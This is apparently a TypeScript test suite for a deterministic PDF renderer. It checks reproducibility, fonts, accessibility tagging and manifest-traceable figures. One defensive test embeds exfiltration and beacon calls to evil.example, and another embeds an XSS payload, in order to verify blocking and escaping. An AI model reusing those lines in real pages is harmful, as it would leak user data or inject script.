import { createHash } from "node:crypto";
import { Snapshot } from "../products/builder";
import { launchChromium, BrowserLike, renderPdf } from "../products/render/pdf";
import { renderGuidePdfs } from "../products/render/render-edition";
import { composeFlowHtml, loadAssets } from "../products/render/compose";
import { resolveFontFamily, verifyFontFamily } from "../products/render/fonts";
import { GuideBlock, GuideDocument } from "../products/guide-model";
import { buildKnowledgeGuide } from "../products/builder";
import { COPY, buildProductWorld, composeAndSubmit, snapshotOf, ProductWorld } from "../testing/product-world";
import { inspectPdf, pdfjsPath } from "../testing/pdf-inspect";
import { describeKl } from "../testing/env";
import { fixtureSnapshot } from "../testing/fixture-snapshot";
import * as fs from "node:fs";
import * as path from "node:path";

const sha = (b: Buffer | string) => createHash("sha256").update(b).digest("hex");
const VID = "abcdefghijklmnopqrstuvwxyz"; // identificador de verificación fijo para comparar corridas
const textOf = (html: string) => html.replace(/<style[\s\S]*?<\/style>/g, "").replace(/<script[\s\S]*?<\/script>/g, "").replace(/<[^>]+>/g, " ").replace(/&nbsp;/g, " ").replace(/\s+/g, " ").trim();

describeKl("R3 · generador determinista de PDF (B6, B7, AC-01, AC-10, AC-13, X19)", () => {
  let pw: ProductWorld;
  let browser: BrowserLike;
  let snap: Snapshot;

  beforeAll(async () => {
    pw = await buildProductWorld();
    browser = await launchChromium();
    snap = await snapshotOf(pw, await composeAndSubmit(pw, "2026.1"));
  });
  afterAll(async () => {
    await browser.close();
    await pw.closeAll();
  });

  describe("Chromium y tipografía (B6, B7)", () => {
    it("Chromium fijado: la versión queda registrada en cada render", async () => {
      expect(browser.version()).toMatch(/^\d+\.\d+\.\d+\.\d+$/);
      const [es] = await renderGuidePdfs(snap, { status: "PUBLISHED", verificationId: VID, family: "lato", browser });
      expect(es?.chromium).toBe(browser.version());
    });

    it("Lato: disponible, licencia SIL OFL 1.1, incrustada en el PDF etiquetado y compatible; Public Sans también (alternativa segura)", async () => {
      for (const family of ["lato", "publicsans"] as const) {
        const v = await verifyFontFamily(family, browser);
        expect({ family, available: v.available, licenseOk: v.licenseOk, compatible: v.compatible, details: v.details }).toEqual({ family, available: true, licenseOk: true, compatible: true, details: [] });
        expect(v.files.every((f) => /^[0-9a-f]{64}$/.test(f.sha256))).toBe(true);
      }
      expect((await resolveFontFamily(browser, "lato")).family).toBe("lato");
      expect((await resolveFontFamily(browser, "publicsans")).family).toBe("publicsans");
    });

    it("el mismo tema compone con Public Sans con la misma estructura (mismo número de páginas y de bloques) y sin hallazgos", async () => {
      const a = await renderGuidePdfs(snap, { status: "PUBLISHED", verificationId: VID, family: "lato", browser });
      const b = await renderGuidePdfs(snap, { status: "PUBLISHED", verificationId: VID, family: "publicsans", browser });
      expect(b.map((x) => x.pages)).toEqual(a.map((x) => x.pages));
      expect(b.map((x) => x.document.pages.length)).toEqual(a.map((x) => x.document.pages.length));
      expect(a[0]?.pdfSha256).not.toBe(b[0]?.pdfSha256); // otra tipografía, otro archivo; igual estructura
    });
  });

  describe("AC-10 · mismo manifiesto, mismo PDF (tres niveles + control negativo)", () => {
    it("contenido, visual y binario normalizado idénticos entre corridas; el binario sin normalizar solo difiere en fechas", async () => {
      const first = await renderGuidePdfs(snap, { status: "PUBLISHED", verificationId: VID, family: "lato", browser, screenshots: true });
      await new Promise((r) => setTimeout(r, 1100)); // otro segundo: cambian CreationDate/ModDate
      const second = await renderGuidePdfs(snap, { status: "PUBLISHED", verificationId: VID, family: "lato", browser, screenshots: true });
      for (const [i, a] of first.entries()) {
        const b = second[i] as typeof a;
        // nivel 1 · contenido
        expect(b.documentSha256).toBe(a.documentSha256);
        expect(b.printHtmlSha256).toBe(a.printHtmlSha256);
        expect(textOf(b.pagedHtml)).toBe(textOf(a.pagedHtml));
        // nivel 2 · visual: cada página rasterizada es idéntica
        expect(b.pagePng?.length).toBe(a.pagePng?.length);
        a.pagePng?.forEach((png, p) => expect(sha(png)).toBe(sha((b.pagePng as Buffer[])[p] as Buffer)));
        // nivel 3 · binario normalizado idéntico
        expect(b.pdfSha256).toBe(a.pdfSha256);
        expect(b.pdf.equals(a.pdf)).toBe(true);
        expect(a.pdf.length).toBeGreaterThan(10_000);
      }
    });

    it("sin normalizar, dos corridas difieren únicamente en CreationDate y ModDate", async () => {
      const assets = loadAssets("lato");
      const doc = buildKnowledgeGuide(snap, { locale: "es", copy: COPY.es, status: "PUBLISHED", verificationId: VID });
      const html = composeFlowHtml(doc, assets);
      const r1 = await renderPdf({ html, paginateJs: assets.paginateJs }, browser);
      await new Promise((r) => setTimeout(r, 1100));
      const r2 = await renderPdf({ html, paginateJs: assets.paginateJs }, browser);
      const mask = (b: Buffer) => b.toString("latin1").replace(/\/(CreationDate|ModDate) \(D:\d{14}[^)]*\)/g, "/$1 (D:MASKED)");
      expect(r1.pdf.equals(r2.pdf)).toBe(false);
      expect(mask(r1.pdf)).toBe(mask(r2.pdf));
    });

    it("control negativo: cambiar una cifra o el identificador de verificación cambia la huella y el texto", async () => {
      const base = (await renderGuidePdfs(snap, { status: "PUBLISHED", verificationId: VID, family: "lato", browser }))[0] as Awaited<ReturnType<typeof renderGuidePdfs>>[number];
      const changed: Snapshot = JSON.parse(JSON.stringify(snap));
      const ref = changed.manifest.unitRefs.find((r) => r.startsWith("stat."));
      (changed.units[ref as string] as { stat: { display: { es: string } } }).stat.display.es = "99.9 %";
      const altered = (await renderGuidePdfs(changed, { status: "PUBLISHED", verificationId: VID, family: "lato", browser }))[0] as typeof base;
      expect(altered.documentSha256).not.toBe(base.documentSha256);
      expect(altered.pdfSha256).not.toBe(base.pdfSha256);
      expect(textOf(altered.pagedHtml)).toContain("99.9 %");
      expect(textOf(base.pagedHtml)).not.toContain("99.9 %");
      const otherId = (await renderGuidePdfs(snap, { status: "PUBLISHED", verificationId: "zyxwvutsrqponmlkjihgfedcba", family: "lato", browser }))[0] as typeof base;
      expect(otherId.pdfSha256).not.toBe(base.pdfSha256);
    });
  });

  describe("AC-10 · línea de referencia entre corridas y entre días (Chromium fijado)", () => {
    const BASELINE = path.join(__dirname, "..", "products", "ac10-baseline.json");
    it("la huella normalizada de la instantánea fija coincide con la línea de referencia registrada para este motor y plataforma", async () => {
      const arts = await renderGuidePdfs(fixtureSnapshot(), { status: "PUBLISHED", verificationId: VID, family: "lato", browser });
      const current = Object.fromEntries(arts.map((a) => [a.locale, { pdfSha256: a.pdfSha256, pages: a.pages, documentSha256: a.documentSha256 }]));
      const key = `${process.platform}-${process.arch}-chromium-${browser.version()}-lato`;
      const baseline = JSON.parse(fs.existsSync(BASELINE) ? fs.readFileSync(BASELINE, "utf8") : "{}") as Record<string, unknown>;
      if (process.env.KL_UPDATE_AC10_BASELINE === "1") {
        fs.writeFileSync(BASELINE, `${JSON.stringify({ ...baseline, [key]: current }, null, 2)}\n`);
        return;
      }
      if (baseline[key]) expect(current).toEqual(baseline[key]);
      else process.stderr.write(`[aviso] sin línea de referencia para ${key}: se verificó la repetibilidad dentro de la corrida; regenere con KL_UPDATE_AC10_BASELINE=1 tras un cambio de Chromium\n`);
      // y siempre: la repetibilidad inmediata
      const again = await renderGuidePdfs(fixtureSnapshot(), { status: "PUBLISHED", verificationId: VID, family: "lato", browser });
      expect(again.map((a) => a.pdfSha256)).toEqual(arts.map((a) => a.pdfSha256));
    });
  });

  describe("AC-13 y A4: PDF etiquetado, navegable y en el idioma del documento", () => {
    it("Tagged, StructTreeRoot, marcadores, /Lang por documento, A4 vertical y fuentes incrustadas", async () => {
      const [es, en] = await renderGuidePdfs(snap, { status: "PUBLISHED", verificationId: VID, family: "lato", browser });
      for (const [a, lang] of [[es, "es"], [en, "en"]] as const) {
        const raw = (a as NonNullable<typeof a>).pdf.toString("latin1");
        expect(raw).toMatch(/\/MarkInfo\s*<<[^>]*\/Marked true/);
        expect(raw).toContain("/StructTreeRoot");
        expect(raw).toContain("/Outlines");
        expect(raw).toContain(`/Lang (${lang})`);
        expect(raw).toMatch(/\/MediaBox \[\s*0\s+0\s+59[45](\.\d+)?\s+84[12](\.\d+)?\s*\]/);
        expect(raw).toMatch(/\/BaseFont \/[A-Z]{6}\+Lato/);
        expect(raw).not.toMatch(/\/BaseFont \/(Helvetica|Times|Arial)/); // sin tipografías sin incrustar
        expect(raw).toMatch(/\/S \/H[1-3]?\b/); // estructura de encabezados
      }
    });

    it("sin ninguna petición de red durante el render de una edición real", async () => {
      const all = await renderGuidePdfs(snap, { status: "PUBLISHED", verificationId: VID, family: "lato", browser });
      expect(all.flatMap((a) => a.blockedRequests)).toEqual([]);
    });
  });

  describe("AC-01/AC-02/AC-04 · cifras y afirmaciones trazables al manifiesto", () => {
    it("toda cifra del documento es el display de una ficha del manifiesto; toda fila de datos tiene fuente, periodo y referencia que resuelve", async () => {
      const arts = await renderGuidePdfs(snap, { status: "PUBLISHED", verificationId: VID, family: "lato", browser });
      for (const a of arts) {
        const blocks = a.document.pages.flatMap((p) => p.blocks);
        const rows = blocks.filter((b): b is Extract<GuideBlock, { type: "matrix_table" }> => b.type === "matrix_table").flatMap((b) => b.rows);
        expect(rows.length).toBeGreaterThan(0);
        for (const r of rows) {
          const u = snap.units[r.unitRef] as NonNullable<Snapshot["units"][string]>;
          expect(r.cells[1]).toBe((u.stat as NonNullable<typeof u.stat>).display[a.locale]); // la cifra sale de la ficha, sin formatear ni calcular
          expect(r.cells[2]).toBe((u.stat as NonNullable<typeof u.stat>).periodLabel);
          expect(a.document.sources[r.ref]).toBeTruthy(); // la referencia resuelve a una entrada del directorio
          expect(snap.manifest.unitRefs).toContain(r.unitRef);
        }
        const used = new Set(blocks.flatMap((b) => (b.type === "labelled_text" || b.type === "editorial_note" ? (b.unitRefs ?? []) : [])));
        for (const ref of used) expect(snap.manifest.unitRefs).toContain(ref);
        // todo lo que se imprime viene de unidades del manifiesto: ninguna unidad ajena aparece
        for (const claim of blocks.filter((b): b is Extract<GuideBlock, { type: "labelled_text" }> => b.type === "labelled_text").flatMap((b) => b.claimIds)) {
          expect(snap.manifest.unitRefs.some((r) => claim.startsWith(`${r.split("@")[0]}@`))).toBe(true);
        }
      }
    });

    it("paridad ES/EN: mismas piezas, mismas citas y mismas cifras por sección", async () => {
      const [es, en] = await renderGuidePdfs(snap, { status: "PUBLISHED", verificationId: VID, family: "lato", browser });
      const shape = (d: GuideDocument) => d.pages.map((p) => [p.id, p.blocks.map((b) => b.type), p.blocks.flatMap((b) => ("claimIds" in b ? b.claimIds : "rows" in b ? b.rows.map((r) => r.unitRef) : []))]);
      expect(shape((en as NonNullable<typeof en>).document)).toEqual(shape((es as NonNullable<typeof es>).document));
    });

    it("el PDF contiene las cifras y el texto aprobados (pdf.js)", async () => {
      if (!pdfjsPath()) {
        process.stderr.write("[aviso] pdf.js no disponible: la extracción de texto del PDF se omite (instálelo fuera del repo, ver README)\n");
        return;
      }
      const arts = await renderGuidePdfs(snap, { status: "PUBLISHED", verificationId: VID, family: "lato", browser });
      for (const a of arts) {
        const info = inspectPdf(a.pdf) as NonNullable<ReturnType<typeof inspectPdf>>;
        const text = info.pages.map((p) => p.text).join(" ").replace(/\s+/g, " ");
        expect(info.numPages).toBe(a.pages);
        expect(info.pages.every((p) => Math.abs(p.width - 595.28) < 1 && Math.abs(p.height - 841.89) < 1)).toBe(true);
        for (const ref of snap.manifest.unitRefs.filter((r) => r.startsWith("stat."))) {
          const u = snap.units[ref] as NonNullable<Snapshot["units"][string]>;
          expect(text).toContain((u.stat as NonNullable<typeof u.stat>).display[a.locale]);
        }
        expect(text).toContain(VID); // identificador de verificación impreso en la edición
        expect(text).not.toMatch(/VISTA PREVIA|PREVIEW/);
        expect(info.outline.length).toBeGreaterThan(0);
      }
    });
  });

  describe("X19 · el render no depende de la red", () => {
    it("toda petición no local durante el render se aborta y el PDF se genera igual", async () => {
      const assets = loadAssets("lato");
      const hostile = `<!doctype html><html lang="es"><head><meta charset="utf-8"><title>x</title><style>${assets.fontCss}\n${assets.themeCss}
        @import url("https://evil.example/style.css"); .x{background:url(https://evil.example/bg.png)}</style></head><body>
        <link rel="stylesheet" href="https://evil.example/s.css"><img src="https://evil.example/pixel.png" alt="">
        <div id="flow" hidden><section class="src-page" data-id="a" data-kind="body" data-chrome="true" data-pillar="p"><header class="sh" data-block="section_header"><p class="eyebrow">A</p><h2>Texto</h2></header></section></div><main id="book"></main>
        <script id="chrome-data" type="application/json">{"left":"l","country":"c","version":"v","guide":"g","bee":"","status":"","continued":"(c)"}</script>
        <script>fetch("https://evil.example/exfil?d=1").catch(()=>{}); new Image().src="https://evil.example/beacon.gif"; navigator.sendBeacon && navigator.sendBeacon("https://evil.example/b","x");</script></body></html>`;
      const r = await renderPdf({ html: hostile, paginateJs: assets.paginateJs }, browser);
      expect(r.pdf.subarray(0, 5).toString()).toBe("%PDF-");
      expect(r.blockedRequests.length).toBeGreaterThanOrEqual(3);
      expect(r.blockedRequests.every((u) => u.startsWith("https://evil.example/"))).toBe(true);
    });
  });

  describe("paginación determinista y falla cerrada (I22)", () => {
    const docWith = (blocks: GuideBlock[]): GuideDocument => ({
      kind: "knowledge_guide", product: "p", locale: "es", status: "PUBLISHED", statusLabel: "",
      edition: { code: "9.9", label: "V9.9", month: "X", monthLong: "x", country: "MX", dataCutoff: "x" }, chrome: { left: "beeside", guide: "g", continued: "(continuación)" }, links: {}, sources: { "01": { label: "S", href: "https://s.example" } },
      pages: [{ id: "estres", kind: "body", chrome: true, pillar: "x", blocks }],
    });
    const rows = (n: number) => Array.from({ length: n }, (_, i) => ({ cells: [`Indicador ${i}`, `${i}.0 %`, "2026-T1"], ref: "01", unitRef: `stat.x.${i}@1` }));

    it("una tabla larga se parte por filas con el encabezado repetido y «(continuación)»; sin hallazgos de lint", async () => {
      const assets = loadAssets("lato");
      const doc = docWith([{ type: "section_header", eyebrow: "A", title: "Estrés", dek: "" }, { type: "matrix_table", title: "Tabla larga", notAvailable: "n/d", columns: ["Indicador", "Valor", "Periodo", "Fuente"], rows: rows(90) }]);
      const r = await renderPdf({ html: composeFlowHtml(doc, assets), paginateJs: assets.paginateJs }, browser);
      expect(r.pages).toBeGreaterThan(2);
      const heads = (r.pagedHtml.match(/<th scope="col">Indicador<\/th>/g) ?? []).length;
      expect(heads).toBe(r.pages);
      expect(r.pagedHtml).toContain("Tabla larga (continuación)");
    });

    it("un texto largo se divide por párrafo con su rótulo repetido; un párrafo más alto que una página detiene la publicación", async () => {
      const assets = loadAssets("lato");
      const paragraph = "Texto sintético de relleno para medir la paginación. ".repeat(12);
      const long = docWith([{ type: "labelled_text", label: "Ficha larga", paragraphs: Array.from({ length: 30 }, () => paragraph), unitRefs: ["x@1"], claimIds: [] }]);
      const ok = await renderPdf({ html: composeFlowHtml(long, assets), paginateJs: assets.paginateJs }, browser);
      expect(ok.pages).toBeGreaterThan(1);
      expect(ok.pagedHtml).toContain("Ficha larga (continuación)");
      const impossible = docWith([{ type: "labelled_text", label: "Imposible", paragraphs: ["palabra ".repeat(6000)], unitRefs: ["x@1"], claimIds: [] }]);
      await expect(renderPdf({ html: composeFlowHtml(impossible, assets), paginateJs: assets.paginateJs }, browser)).rejects.toMatchObject({ code: "layout_failed" });
    });

    it("un bloque indivisible demasiado alto detiene la publicación (nunca se reduce letra ni se recorta)", async () => {
      const assets = loadAssets("lato");
      const huge = docWith([{ type: "journey", blockId: "j", version: "1", sha256: "a".repeat(64), steps: Array.from({ length: 80 }, (_, i) => ({ title: `Paso ${i}`, text: "Texto sintético. ".repeat(30) })) }]);
      await expect(renderPdf({ html: composeFlowHtml(huge, assets), paginateJs: assets.paginateJs }, browser)).rejects.toMatchObject({ code: "layout_failed" });
    });

    it("un desglose que no suma o un enlace sin configurar detienen la composición (no se dibuja un total falso)", () => {
      const assets = loadAssets("lato");
      expect(() => composeFlowHtml(docWith([{ type: "bar_breakdown", title: "t", legend: "l", total: 100, segments: [{ label: "a", value: 60, display: "60 %" }, { label: "b", value: 30, display: "30 %" }] }]), assets)).toThrow(/no suma/);
      expect(() => composeFlowHtml(docWith([{ type: "cta_link", linkKey: "kl.links.nada", label: "x", text: "y" }]), assets)).toThrow(/sin enlace configurado/);
      expect(() => composeFlowHtml(docWith([{ type: "matrix_table", title: "t", notAvailable: "n", columns: ["a"], rows: [{ cells: ["x", "1", "2"], ref: "99", unitRef: "u@1" }] }]), assets)).toThrow(/sin entrada en el directorio/);
    });

    it("el contenido no puede inyectar HTML: todo se escapa", async () => {
      const assets = loadAssets("lato");
      const doc = docWith([{ type: "labelled_text", label: '<img src=x onerror="alert(1)">', paragraphs: ['<script>fetch("https://evil.example")</script>'], unitRefs: [], claimIds: [] }]);
      const flow = composeFlowHtml(doc, assets);
      expect(flow).not.toContain("<script>fetch");
      const r = await renderPdf({ html: flow, paginateJs: assets.paginateJs }, browser);
      expect(r.blockedRequests).toEqual([]);
    });
  });

  describe("vista previa frente a edición publicada", () => {
    it("la vista previa lleva marca visible en cada página y no identificador; la publicada no lleva marca", async () => {
      const [pre] = await renderGuidePdfs(snap, { status: "PREVIEW", family: "lato", browser });
      const [pub] = await renderGuidePdfs(snap, { status: "PUBLISHED", verificationId: VID, family: "lato", browser });
      const preview = pre as NonNullable<typeof pre>;
      const published = pub as NonNullable<typeof pub>;
      expect((preview.pagedHtml.match(/class="mark-diag"/g) ?? []).length).toBe(preview.pages);
      expect(published.pagedHtml).not.toContain('class="mark-diag"');
      expect(textOf(preview.pagedHtml)).toContain("VISTA PREVIA");
      expect(textOf(preview.pagedHtml)).not.toContain(VID);
      expect(textOf(published.pagedHtml)).toContain(VID);
      expect(preview.pdfSha256).not.toBe(published.pdfSha256);
    });
  });
});
